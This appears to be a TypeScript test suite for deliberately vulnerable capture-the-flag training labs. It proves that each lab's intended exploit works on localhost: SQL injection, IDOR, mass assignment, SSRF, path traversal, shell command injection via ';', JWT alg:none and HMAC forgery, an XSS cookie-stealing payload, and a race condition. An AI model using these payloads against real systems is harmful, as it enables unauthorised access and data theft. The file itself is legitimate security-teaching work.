import { spawn, spawnSync, type ChildProcess } from 'node:child_process';
import { createHmac, randomBytes } from 'node:crypto';
import { existsSync } from 'node:fs';
import { afterAll, describe, expect, it } from 'vitest';

/**
 * The labs are vulnerable on purpose. These tests prove the intended attack
 * works (a lab nobody can solve is a broken challenge) and that the honest path
 * does NOT reveal the flag (a lab that gives the flag away teaches nothing).
 */
const running: ChildProcess[] = [];
afterAll(() => {
  // Kill whole process trees: the XSS lab starts a browser that would outlive its parent.
  for (const p of running) {
    if (p.pid === undefined) continue;
    if (process.platform === 'win32') spawnSync('taskkill', ['/pid', String(p.pid), '/T', '/F']);
    else
      try {
        process.kill(-p.pid, 'SIGKILL');
      } catch {
        // already gone
      }
  }
});

async function lab(name: string, flag: string, extraEnv: Record<string, string> = {}): Promise<string> {
  const child = spawn(process.execPath, ['--disable-warning=ExperimentalWarning', `labs/${name}/server.mjs`], {
    // A minimal environment (no secrets of the test runner), plus what a browser needs on Windows.
    env: {
      PATH: process.env.PATH,
      ...Object.fromEntries(['SystemRoot', 'TEMP', 'TMP', 'LOCALAPPDATA'].flatMap((k) => (process.env[k] ? [[k, process.env[k]]] : []))),
      FLAG: flag,
      PORT: '0',
      HOST: '127.0.0.1',
      ...extraEnv,
    },
    stdio: ['ignore', 'pipe', 'inherit'],
    // Own process group on POSIX, so afterAll can kill the lab and anything it started.
    detached: process.platform !== 'win32',
  });
  running.push(child);
  const port = await new Promise<string>((resolve, reject) => {
    child.stdout.on('data', (d: Buffer) => {
      const m = /listening on (\d+)/.exec(d.toString());
      if (m?.[1]) resolve(m[1]);
    });
    child.on('exit', (code) => {
      reject(new Error(`lab exited with ${String(code)}`));
    });
  });
  return `http://127.0.0.1:${port}`;
}

const newFlag = () => `BASTION{${randomBytes(16).toString('hex')}}`;
const form = (fields: Record<string, string>) => ({
  method: 'POST',
  headers: { 'content-type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams(fields).toString(),
});
const json = (body: unknown, token?: string) => ({
  method: 'POST',
  headers: { 'content-type': 'application/json', ...(token ? { authorization: `Bearer ${token}` } : {}) },
  body: JSON.stringify(body),
});
const bearer = (token: string) => ({ headers: { authorization: `Bearer ${token}` } });

describe('labs refuse to start without a flag', () => {
  it.each(['sqli-login', 'idor-invoices', 'mass-assignment', 'ssrf-preview', 'path-traversal', 'command-injection', 'jwt-none', 'xss-stored', 'chained-intranet', 'race-coupon'])('%s', async (name) => {
    const child = spawn(process.execPath, [`labs/${name}/server.mjs`], { env: { PATH: process.env.PATH }, stdio: 'ignore' });
    expect(await new Promise((resolve) => child.on('exit', resolve))).toBe(1);
  });
});

describe('lab sqli-login', () => {
  it('the demo account sees no flag, guessing fails, SQL injection logs in as admin', async () => {
    const flag = newFlag();
    const base = await lab('sqli-login', flag);
    const demo = await fetch(`${base}/connexion`, form({ identifiant: 'stagiaire', mot_de_passe: 'stagiaire' }));
    expect(demo.status).toBe(200);
    expect(await demo.text()).not.toContain(flag);
    expect((await fetch(`${base}/connexion`, form({ identifiant: 'admin', mot_de_passe: 'admin' }))).status).toBe(401);

    const quote = await fetch(`${base}/connexion`, form({ identifiant: "'", mot_de_passe: 'x' }));
    expect(quote.status).toBe(500); // the verbose error leaks the query: the first clue
    expect(await quote.text()).toMatch(/SELECT identifiant, role FROM utilisateurs/);

    const injected = await fetch(`${base}/connexion`, form({ identifiant: "admin' -- ", mot_de_passe: 'x' }));
    expect(await injected.text()).toContain(flag);
  });
});

describe('lab idor-invoices', () => {
  it('my invoices list hides the others, but fetching one by id does not check the owner', async () => {
    const flag = newFlag();
    const base = await lab('idor-invoices', flag);
    expect((await fetch(`${base}/api/factures/1001`)).status).toBe(401);
    const { jeton } = (await (await fetch(`${base}/api/connexion`, json({ identifiant: 'alice', mot_de_passe: 'alice' }))).json()) as { jeton: string };
    const mine = await (await fetch(`${base}/api/mes-factures`, bearer(jeton))).text();
    expect(mine).not.toContain(flag);
    expect(mine).not.toContain('1001');
    const other = (await (await fetch(`${base}/api/factures/1001`, bearer(jeton))).json()) as { note: string };
    expect(other.note).toContain(flag);
  });
});

describe('lab mass-assignment', () => {
  it('a normal sign-up is refused the report; adding "role": "admin" to the body grants it', async () => {
    const flag = newFlag();
    const base = await lab('mass-assignment', flag);
    const normal = (await (await fetch(`${base}/api/inscription`, json({ email: 'a@lab.test', mot_de_passe: 'x' }))).json()) as {
      jeton: string;
      compte: { role: string };
    };
    expect(normal.compte.role).toBe('membre');
    expect((await fetch(`${base}/api/admin/rapport`, bearer(normal.jeton))).status).toBe(403);

    const evil = (await (await fetch(`${base}/api/inscription`, json({ email: 'm@lab.test', mot_de_passe: 'x', role: 'admin' }))).json()) as {
      jeton: string;
    };
    const report = (await (await fetch(`${base}/api/admin/rapport`, bearer(evil.jeton))).json()) as { flag: string };
    expect(report.flag).toBe(flag);
  });
});

describe('lab ssrf-preview', () => {
  it('previews public pages; pointing it at its own loopback reaches the internal admin service', async () => {
    const flag = newFlag();
    const internalPort = String(20_000 + Math.floor(Math.random() * 20_000));
    const base = await lab('ssrf-preview', flag, { INTERNAL_PORT: internalPort });
    const home = await (await fetch(`${base}/`)).text();
    expect(home).not.toContain(flag);
    expect((await fetch(`${base}/apercu?url=file:///etc/passwd`)).status).toBe(400);
    const internal = `http://127.0.0.1:${internalPort}/admin/config`;
    expect(await (await fetch(`${base}/apercu?url=${encodeURIComponent(internal)}`)).text()).toContain(flag);
  });
});

describe('lab path-traversal', () => {
  it('serves its public documents, and "../" walks out of the folder to the backup credentials', async () => {
    const flag = newFlag();
    const base = await lab('path-traversal', flag);
    const honest = await (await fetch(`${base}/telecharger?fichier=planning-conges.txt`)).text();
    expect(honest).toMatch(/Planning/);
    expect(honest).not.toContain(flag);
    expect(await (await fetch(`${base}/telecharger?fichier=../../secrets/sauvegarde.conf`)).text()).toContain(flag);
  });
});

// Needs /bin/sh: runs on Linux (CI) and is checked in its container; skipped on Windows hosts.
describe.skipIf(process.platform === 'win32')('lab command-injection', () => {
  it('a domain name gets a lookup; a ";" gets a shell', async () => {
    const flag = newFlag();
    const base = await lab('command-injection', flag);
    expect(await (await fetch(`${base}/diagnostic?domaine=localhost`)).text()).not.toContain(flag);
    expect(await (await fetch(`${base}/diagnostic?domaine=${encodeURIComponent('x; env')}`)).text()).toContain(flag);
  });
});

describe('lab jwt-none', () => {
  it('a guest token is refused the secrets; the same claims with "alg": "none" and no signature are accepted', async () => {
    const flag = newFlag();
    const base = await lab('jwt-none', flag);
    const { jeton } = (await (await fetch(`${base}/api/invite`, { method: 'POST' })).json()) as { jeton: string };
    expect((await fetch(`${base}/api/admin/secrets`, bearer(jeton))).status).toBe(403);
    // Tampering with a signed token is caught: the signature is checked when alg is HS256.
    const [head, , sig] = jeton.split('.');
    const admin = Buffer.from(JSON.stringify({ sub: 'x', role: 'admin' })).toString('base64url');
    expect((await fetch(`${base}/api/admin/secrets`, bearer(`${head ?? ''}.${admin}.${sig ?? ''}`))).status).toBe(401);
    const none = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
    const res = (await (await fetch(`${base}/api/admin/secrets`, bearer(`${none}.${admin}.`))).json()) as { secret: string };
    expect(res.secret).toBe(flag);
  });
});

const chrome = [
  process.env.CHROME_BIN,
  'C:/Program Files/Google/Chrome/Application/chrome.exe',
  '/usr/bin/google-chrome',
  '/usr/bin/chromium',
  '/usr/bin/chromium-browser',
].find((p): p is string => p !== undefined && existsSync(p));

// Needs a real browser (the moderator bot): present locally and on GitHub runners, checked in its container too.
describe.skipIf(chrome === undefined)('lab xss-stored', () => {
  it('the public page escapes; the moderation page runs the payload with the readable cookie of the bot', async () => {
    const flag = newFlag();
    const base = await lab('xss-stored', flag, { CHROME_BIN: chrome ?? '' });
    const plain = new URLSearchParams({ auteur: 'moi', message: '<b>bonjour</b>' }).toString();
    const post = (body: string) => fetch(`${base}/messages`, { method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded' }, body, redirect: 'manual' });
    expect((await post(plain)).status).toBe(303);
    expect(await (await fetch(`${base}/`)).text()).toContain('&#60;b&#62;bonjour');
    expect((await fetch(`${base}/admin/moderation`)).status).toBe(403);

    // No route out of a lab: the payload sends the cookie back into the guestbook itself.
    const payload = `<img src=x onerror="fetch('/messages',{method:'POST',headers:{'content-type':'application/x-www-form-urlencoded'},body:'auteur=vol&message='+encodeURIComponent(document.cookie)})">`;
    await post(new URLSearchParams({ auteur: 'moi', message: payload }).toString());
    let page = '';
    for (let i = 0; i < 40 && !page.includes(flag); i++) {
      await new Promise((r) => setTimeout(r, 500));
      page = await (await fetch(`${base}/`)).text();
    }
    expect(page).toContain(`session_moderateur=${flag}`);
  }, 60_000);
});

describe('lab chained-intranet', () => {
  it('no single flaw is enough; traversal → leaked secret → forged admin token is', async () => {
    const flag = newFlag();
    const base = await lab('chained-intranet', flag);
    const login = (await (await fetch(`${base}/api/connexion`, json({ identifiant: 'invite', mot_de_passe: 'invite' }))).json()) as { jeton: string };
    expect((await fetch(`${base}/api/admin/rapport`, bearer(login.jeton))).status).toBe(403);
    // alg:none and tampering are refused: the JWT check itself is sound.
    const admin = Buffer.from(JSON.stringify({ sub: 'x', role: 'admin' })).toString('base64url');
    const none = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
    expect((await fetch(`${base}/api/admin/rapport`, bearer(`${none}.${admin}.`))).status).toBe(401);
    const [head, , sig] = login.jeton.split('.');
    expect((await fetch(`${base}/api/admin/rapport`, bearer(`${head ?? ''}.${admin}.${sig ?? ''}`))).status).toBe(401);
    // The error message gives the documents' location; the traversal reads the config.
    const leak = await (await fetch(`${base}/documents?nom=nope`)).text();
    expect(leak).toMatch(/Introuvable : .*documents/);
    const config = await (await fetch(`${base}/documents?nom=${encodeURIComponent('../config/app.env')}`)).text();
    expect(config).not.toContain(flag);
    const secret = /JWT_SECRET=([0-9a-f]+)/.exec(config)?.[1] ?? '';
    expect(secret).toHaveLength(64);
    const h = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
    const forged = `${h}.${admin}.${createHmac('sha256', secret).update(`${h}.${admin}`).digest('base64url')}`;
    expect(((await (await fetch(`${base}/api/admin/rapport`, bearer(forged))).json()) as { reference: string }).reference).toBe(flag);
  });
});

describe('lab race-coupon', () => {
  it('one request at a time the card works once; sent in parallel it is credited many times', async () => {
    const flag = newFlag();
    const base = await lab('race-coupon', flag);
    const redeem = () => fetch(`${base}/api/cartes/utiliser`, json({ code: 'BIENVENUE10' }));
    const buy = (article: string) => fetch(`${base}/api/acheter`, json({ article }));
    // Honest path: the single-use rule holds, 10 € never buys the 50 € report.
    expect((await redeem()).status).toBe(200);
    expect((await redeem()).status).toBe(409);
    expect((await buy('rapport-confidentiel')).status).toBe(402);
    expect((await buy('nope')).status).toBe(404);
    expect((await fetch(`${base}/api/cartes/utiliser`, json({ code: 'AUTRE' }))).status).toBe(404);
    // Race: every concurrent request passes the check before any of them marks the card.
    await fetch(`${base}/api/reinitialiser`, { method: 'POST' });
    const results = await Promise.all(Array.from({ length: 8 }, redeem));
    expect(results.filter((r) => r.status === 200).length).toBeGreaterThanOrEqual(5);
    const report = (await (await buy('rapport-confidentiel')).json()) as { contenu: string };
    expect(report.contenu).toContain(flag);
  });
});
